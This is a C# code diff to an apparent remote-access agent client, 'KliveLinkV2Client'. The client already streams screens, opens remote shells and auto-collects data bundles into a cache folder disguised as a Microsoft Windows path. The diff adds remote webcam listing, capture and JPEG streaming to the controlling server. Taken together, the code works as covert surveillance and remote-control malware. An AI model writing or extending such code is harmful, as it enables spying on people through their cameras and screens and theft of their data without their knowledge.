@@ -15,6 +15,7 @@ public sealed class KliveLinkV2Client : IDisposable
     private readonly string? _pinSha256;
     private readonly V2CommandDispatcher _dispatcher;
     private readonly ScreenCaptureService _screenCapture;
+    private readonly CameraCaptureService _cameraCapture;
     private readonly SemaphoreSlim _sendLock = new(1, 1);
     private readonly SemaphoreSlim _commandSlots = new(4, 4);
     private readonly SemaphoreSlim _collectGate = new(1, 1);
@@ -27,19 +28,23 @@ public sealed class KliveLinkV2Client : IDisposable
     private Task? _autoTask;
     private long _lastActivityUtcTicks;
 
-    private static readonly string CacheDirectory = Path.Combine(
-        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-        "Microsoft", "Windows", "Caches");
-    private static readonly string PendingZipPath = Path.Combine(CacheDirectory, "k.pending.zip");
-    private static readonly string PendingManifestPath = Path.Combine(CacheDirectory, "k.pending.json");
-    private static readonly string AutoStatePath = Path.Combine(CacheDirectory, "k.auto.json");
+    private static readonly string CacheDirectory = OperatingSystem.IsWindows()
+        ? Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+            "Microsoft", "Windows", "Caches")
+        : Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+            OperatingSystem.IsMacOS() ? "KliveLink" : "klivelink");
+
+    private string AgentFileSuffix => string.Concat(_agentId.Where(c => char.IsLetterOrDigit(c) || c is '-' or '_' or '.'));
+    private string PendingZipPath => Path.Combine(CacheDirectory, $"k.{AgentFileSuffix}.pending.zip");
+    private string PendingManifestPath => Path.Combine(CacheDirectory, $"k.{AgentFileSuffix}.pending.json");
+    private string AutoStatePath => Path.Combine(CacheDirectory, $"k.{AgentFileSuffix}.auto.json");
 
     public bool IsConnected => _socket?.State == WebSocketState.Open;
     public event Action<string>? OnLog;
 
     public KliveLinkV2Client(string serverUri, string agentId, string token,
         V2CommandDispatcher dispatcher, ScreenCaptureService screenCapture, string? pinSha256 = null,
-        V2CollectionTier autoTier = V2CollectionTier.T1)
+        V2CollectionTier autoTier = V2CollectionTier.T1, CameraCaptureService? cameraCapture = null)
     {
         _serverUri = serverUri;
         _agentId = agentId;
@@ -48,7 +53,9 @@ public sealed class KliveLinkV2Client : IDisposable
         _autoTier = autoTier;
         _dispatcher = dispatcher;
         _screenCapture = screenCapture;
+        _cameraCapture = cameraCapture ?? new CameraCaptureService();
         _screenCapture.OnFrameCaptured += frame => _ = SendScreenFrameAsync(frame);
+        _cameraCapture.OnFrameCaptured += frame => _ = SendCameraFrameAsync(frame);
     }
 
     public async Task ConnectAsync(CancellationToken cancellationToken = default)
@@ -260,6 +267,28 @@ public sealed class KliveLinkV2Client : IDisposable
                     await SendFrameAsync(V2FrameType.StreamEnd, new V2StreamEnd { StreamId = 1 }, CancellationToken.None);
                     result = Ok(command, new { stopped = true });
                     break;
+                case V2CommandOperation.CameraList:
+                    result = Ok(command, _cameraCapture.ListCameras());
+                    break;
+                case V2CommandOperation.CameraStart:
+                    var cameraRequest = Read<V2CameraStartRequest>(payload);
+                    var cameraStart = _cameraCapture.Start(cameraRequest);
+                    if (cameraStart.Started)
+                        await SendFrameAsync(V2FrameType.StreamOpen, new V2StreamOpen
+                        {
+                            StreamId = 2,
+                            Kind = "camera",
+                            Metadata = V2Json.Serialize(new { cameraIndex = cameraRequest.CameraIndex }),
+                        }, CancellationToken.None);
+                    result = cameraStart.Started
+                        ? Ok(command, new { started = true, streamId = 2 })
+                        : new V2Result { CommandId = command.CommandId, Status = V2CommandStatus.Failed, Error = cameraStart.Error };
+                    break;
+                case V2CommandOperation.CameraStop:
+                    _cameraCapture.Stop();
+                    await SendFrameAsync(V2FrameType.StreamEnd, new V2StreamEnd { StreamId = 2 }, CancellationToken.None);
+                    result = Ok(command, new { stopped = true });
+                    break;
                 case V2CommandOperation.ShellOpen:
                     _shell?.Stop();
                     _shell = new V2ShellSession(text => _ = SendFrameAsync(V2FrameType.ShellOutput, new V2ShellOutput { Text = text }, CancellationToken.None));
@@ -448,7 +477,7 @@ public sealed class KliveLinkV2Client : IDisposable
         _ => 50L * 1024 * 1024,
     };
 
-    private static bool ShouldAutoCollect()
+    private bool ShouldAutoCollect()
     {
         if (File.Exists(PendingZipPath) || File.Exists(PendingManifestPath)) return true;
         try
@@ -463,7 +492,7 @@ public sealed class KliveLinkV2Client : IDisposable
         return true;
     }
 
-    private static void WriteAutoState()
+    private void WriteAutoState()
     {
         try
         {
@@ -473,7 +502,7 @@ public sealed class KliveLinkV2Client : IDisposable
         catch { }
     }
 
-    private static void SavePending(V2CollectionBundle bundle)
+    private void SavePending(V2CollectionBundle bundle)
     {
         try
         {
@@ -486,7 +515,7 @@ public sealed class KliveLinkV2Client : IDisposable
         catch { }
     }
 
-    private static V2CollectionBundle? LoadPendingBundle()
+    private V2CollectionBundle? LoadPendingBundle()
     {
         try
         {
@@ -505,7 +534,7 @@ public sealed class KliveLinkV2Client : IDisposable
         catch { return null; }
     }
 
-    private static void ClearPending()
+    private void ClearPending()
     {
         try { File.Delete(PendingZipPath); } catch { }
         try { File.Delete(PendingManifestPath); } catch { }
@@ -525,6 +554,27 @@ public sealed class KliveLinkV2Client : IDisposable
                     width = frame.Width,
                     height = frame.Height,
                     monitor = frame.MonitorIndex,
+                    at = DateTimeOffset.UtcNow,
+                }, V2Json.Options),
+            }, _cts?.Token ?? CancellationToken.None);
+        }
+        catch { }
+    }
+
+    private async Task SendCameraFrameAsync(CameraFrame frame)
+    {
+        if (!IsConnected) return;
+        try
+        {
+            await SendFrameAsync(V2FrameType.StreamData, new V2StreamData
+            {
+                StreamId = 2,
+                Base64 = Convert.ToBase64String(frame.Jpeg),
+                Metadata = JsonSerializer.Serialize(new
+                {
+                    width = frame.Width,
+                    height = frame.Height,
+                    cameraIndex = frame.CameraIndex,
                     at = DateTimeOffset.UtcNow,
                 }, V2Json.Options),
             }, _cts?.Token ?? CancellationToken.None);
@@ -577,6 +627,7 @@ public sealed class KliveLinkV2Client : IDisposable
         _shell?.Stop();
         _cts?.Cancel();
         _screenCapture.Dispose();
+        _cameraCapture.Dispose();
         _socket?.Dispose();
     }
 }
